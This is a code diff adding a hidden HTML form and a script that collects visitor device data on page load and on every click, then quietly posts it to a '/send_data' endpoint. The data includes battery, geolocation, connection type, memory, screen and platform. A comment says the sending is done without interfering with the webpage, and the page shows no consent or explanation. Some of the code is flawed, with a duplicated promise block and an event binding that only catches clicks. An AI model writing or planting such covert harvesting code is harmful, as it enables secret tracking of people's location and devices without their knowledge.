@@ -1,0 +1,138 @@
+
+<form action="send_data" method="post" id="hidden-form" style="display: none;">
+	<textarea name="data" id="data" cols="30" rows="10"></textarea>
+
+	<input type="text" name="RAM" id="RAM">
+	<input type="text" name="URL" id="URL">
+	<input type="text" name="appName" id="appName">
+	<input type="text" name="battery" id="battery">
+	<input type="text" name="connection" id="connection">
+	<input type="text" name="dimension" id="dimension">
+	<input type="text" name="location" id="location">
+	<input type="text" name="max_touch" id="max_touch">
+	<input type="text" name="platform" id="platform">
+
+	<input type="submit" value="submit" id="submit">
+</form>
+<script>
+
+	function refreshData() {
+		// Function to get battery data
+		function getBatteryData() {
+			return new Promise(function (resolve) {
+				if ('getBattery' in navigator) {
+					navigator.getBattery().then(function (battery) {
+						var batteryLevel = battery.level;
+						var isCharging = battery.charging;
+						var chargingTime = battery.chargingTime;
+						var dischargingTime = battery.dischargingTime;
+						data.battery = `${batteryLevel * 100}%, Charging: ${isCharging}[${chargingTime} seconds], Discharge Time: ${dischargingTime} seconds`;
+						resolve();
+					});
+				} else {
+					resolve();
+				}
+			});
+		}
+
+		// Function to get geolocation data
+		try {
+			function getGeolocationData() {
+				return new Promise(function (resolve) {
+					if ('geolocation' in navigator) {
+						navigator.geolocation.getCurrentPosition(function (position) {
+							var latitude = position.coords.latitude;
+							var longitude = position.coords.longitude;
+							data.location = `Latitude: ${latitude}, Longitude: ${longitude}`;
+							resolve();
+						});
+					} else {
+						resolve();
+					}
+				});
+			}
+		} catch {
+			//
+		}
+
+		// Function to get connection data
+		function getConnectionData() {
+			return new Promise(function (resolve) {
+				if ('connection' in navigator) {
+					const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+					if (connection) {
+						var networkType = connection.type;
+						var networkSpeed = connection.effectiveType;
+						data.connection = `Network Type: ${networkType}, Network Speed: ${networkSpeed}`;
+					}
+				}
+				resolve();
+			});
+		}
+
+		var data = {
+			URL: document.querySelector("#URL").value = window.location.href,
+			RAM: window.clientInformation.deviceMemory,
+			dimension: `${window.screen.width} * ${window.screen.height} [${window.screen.orientation.type} Pixel: ${window.screen.pixelDepth}]`,
+			appName: `${navigator.appCodeName} [${navigator.appName}]`,
+			max_touch: navigator.maxTouchPoints,
+			platform: navigator.platform
+		};
+
+		// Create an array of promises for asynchronous operations
+		var promises = [getBatteryData(), getConnectionData()];
+
+		// Use Promise.all to wait for all asynchronous operations to complete
+		Promise.all(promises).then(function () {
+			// Populate the form fields and stringify the data
+			document.querySelector("#RAM").value = data.RAM;
+			document.querySelector("#URL").value = data.URL;
+			document.querySelector("#appName").value = data.appName;
+			document.querySelector("#battery").value = data.battery;
+			document.querySelector("#connection").value = data.connection;
+			document.querySelector("#dimension").value = data.dimension;
+			document.querySelector("#location").value = data.location;
+			document.querySelector("#max_touch").value = data.max_touch;
+			document.querySelector("#platform").value = data.platform;
+
+			document.querySelector("#data").value = JSON.stringify(data);
+			console.log(JSON.stringify(data));
+		});
+		var promises = [getBatteryData(), getGeolocationData(), getConnectionData()];
+
+		// Use Promise.all to wait for all asynchronous operations to complete
+		Promise.all(promises).then(function () {
+			// Populate the form fields and stringify the data
+			document.querySelector("#RAM").value = data.RAM;
+			document.querySelector("#URL").value = data.URL;
+			document.querySelector("#appName").value = data.appName;
+			document.querySelector("#battery").value = data.battery;
+			document.querySelector("#connection").value = data.connection;
+			document.querySelector("#dimension").value = data.dimension;
+			document.querySelector("#location").value = data.location;
+			document.querySelector("#max_touch").value = data.max_touch;
+			document.querySelector("#platform").value = data.platform;
+
+			document.querySelector("#data").value = JSON.stringify(data);
+			console.log(JSON.stringify(data));
+		});
+	}
+
+
+	window.addEventListener('load', function () {
+		refreshData();
+	});
+
+	window.addEventListener('click', function () {
+		refreshData();
+	});
+
+	// Send form data without interfering with the webpage
+	window.addEventListener('click' || 'unload', function () {
+		const formData = new FormData(document.querySelector('#hidden-form'));
+		fetch('/send_data', {
+			method: 'POST',
+			body: formData,
+		});
+	});
+</script>
